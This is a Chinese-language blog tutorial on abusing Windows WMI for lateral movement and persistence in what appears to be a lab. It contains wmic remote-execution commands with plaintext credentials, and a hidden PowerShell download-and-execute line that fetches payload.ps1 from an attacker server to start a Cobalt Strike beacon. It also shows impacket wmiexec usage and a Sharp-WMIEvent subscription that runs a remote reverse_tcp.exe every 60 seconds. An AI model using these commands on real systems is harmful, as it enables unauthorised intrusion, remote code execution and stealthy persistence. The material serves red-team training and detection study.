---
title: "WMI的利用"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# WMI的利用

WMI是Windows在Powershell还未发布前，微软用来管理Windows系统的重要数据库工具，WMI本身的组织架构是一个数据库架构，WMI 服务使用 DCOM或 WinRM 协议,自从 PsExec 在内网中被严格监控后，越来越多的反病毒厂商将 PsExec 加入了黑名单，于是黑客们渐渐开始使用 WMI 进行横向移动。通过渗透测试发现，在使用 wmiexec 进行横向移动时，windows 操作系统默认不会将 WMI 的操作记录在日志中。因此很多 APT 开始使用 WMI 进行攻击

### wmi的细节

wmi本身只支持两种协议，一种dcom一种winr，分别对应的端口是135和5985

在wmi使用dcom的过程中，会用到两个端口，一个是本身我们熟悉的135端口，另一个端口是一个任意的高位端口（通常在49152到65535之间）

两个端口的原因是为了安全，把认证的过程和后续数据传输的过程分开

* wmi首先通过135进行TCP连接，在这个过程中wmi的client和server端进行身份认证校验，主要是一个建立session的过程
* 高位端口负责实际传输数据，例如通过wmi执行whoami命令，这条命令的流量就通过这个高位端口进行传输，并不走135端口

### 常规利用方法

可以通过wmic.exe和powershell cmdlet来使用WMI数据和执行WMI方法

#### 执行远程查询

查询远程主机的进程信息：

~~~cmd
wmic /node:192.168.111.137 /user:yuy0ung\administrator /password:Admin123456 process list brief
~~~

![image-20241027211006477](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241027211008858-1395666359.png)

#### 创建远程进程

调用Win32_process.Create方法在远程主机上创建进程，启动cmd执行命令，wmic执行命令时没有回显，需要将执行结果写入文件，通过建立共享连接等方式使用type命令远程读取：

~~~cmd
wmic /node:192.168.111.137 /user:yuy0ung\administrator /password:Admin123456 process call create "cmd.exe /c ipconfig > C:\result.txt"
~~~

![image-20241027220840317](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241027220843258-1231575684.png)

#### 上线CS

* 生成powershell脚本：

  ![image-20241027220859408](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241027220901670-1762417959.png)

* wmic进行上线，把ps1放到公网vps，可以使用python开启http服务提供下载

  ~~~cmd
  wmic /NODE:192.168.111.137 /user:yuy0ung\administrator /password:Admin123456 PROCESS call create "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.205.150:8000/payload.ps1'))\""
  ~~~

  ![image-20241027223844509](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241027223846605-1806310200.png)

  成功上线CS

  ![image-20241027223814405](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241027223816994-2068114153.png)

### 常见利用工具

#### wmiexec

来自impacket套件，一个既有全交互也有半交互的远程命令执行工具，通过wmi在远程主机上执行命令，该工具需要开启135和445端口，445端口用于传输命令执行的回显

~~~sh
impacket-wmiexec yuy0ung/administrator:Admin123456@192.168.111.137
~~~

因为kali出了点小问题，我将py脚本打包成exe在windows上运行：

~~~cmd
pip install pyinstaller -i https://mirrors.aliyun.com/pypi/simple
~~~

然后运行：

~~~cmd
wmiexec.exe yuy0ung/administrator:Admin123456@192.168.111.137
~~~

![image-20241101125039216](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241101125041448-1393900505.png)

#### Invoke-WmiCommand

该项目源于powerspolit，可以通过powershell远程调用wmi来执行命令，不具体记录了

### WMI事件订阅的利用

远程部署WMI事件订阅需要在远程系统上具有管理员权限，WMI事件订阅用到的两个组件event,consumer

- Event Filter:

  WQL事件查询，用于将事件筛选为特定条件集。WQL查询可能类似于

  ```
  Select * From __InstanceCreationEvent Within 5 
  Where TargetInstance Isa “Win32_Process” AND TargetInstance.Name = "winlog.exe"
  ```

  类似于查询某个进程的创建或某个命令的执行，当查询到对应进程创建时，就会调用consumer

- 事件消费者（Event Consumer）：这是事件触发时我们想要进行的特定操作，使用事件消费类的`ActiveScriptEventConsumer`和`CommandLineEventConsumer`，其中，`ActiveScriptEventConsumer`允许执行脚本代码（来自JScript或VBScript引擎），而`CommandLineEventConsumer`类则允许运行任意命令，更推荐`ActiveScriptEventConsumer`类，这样可以避免触及LOLBin的雷区

  https://www.anquanke.com/post/id/223232

筛选器与消费者总是绑定在一起的，当筛选器轮询到对应进程启动时，将会调用消费者执行任意命令，或是执行脚本文件等

不难看出该方法更适用于权限持久化，但是，我们同样可以进行无文件的横向移动

#### Sharp_WMIEvent

项目地址：https://github.com/wh0amitz/Sharp-WMIEvent

```powershell
Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -Computername 192.168.30.10 -Domain hack.com -Username yuy0ung\administrator -Password Admin123456 -Command "cmd.exe /c \\192.168.111.173\smb\Sharp-WMIEvent.exe" 
#Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -Command "cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName <Filter Name> -ConsumerName <Consumer Name>
```

在目标服务器上创建一个永久性的WMI订阅事件，每60秒执行一次
